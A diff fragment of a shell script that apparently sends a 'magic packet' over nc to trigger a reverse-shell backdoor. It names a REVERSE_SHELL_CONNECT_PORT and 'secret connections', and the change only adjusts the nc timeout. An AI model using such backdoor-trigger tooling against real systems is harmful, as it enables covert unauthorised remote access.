@@ -8,7 +8,7 @@ echo "Sending magic packet to $SERVER_HOST:$SERVER_MAGIC_PORT"
 
 # You can edit the nc command, and impliment logic for successful secret connections.
 REVERSE_SHELL_CONNECT_PORT=8081
-echo "$MAGIC" | nc -vvv -n $SERVER_HOST $SERVER_MAGIC_PORT -w 0 && echo "Magic sent..."
+echo "$MAGIC" | nc -vvv -n $SERVER_HOST $SERVER_MAGIC_PORT -w 1 && echo "Magic sent..."
 if [[ $? -eq 1 ]]; then
     echo "Failed to connect to the host."
     exit 1 
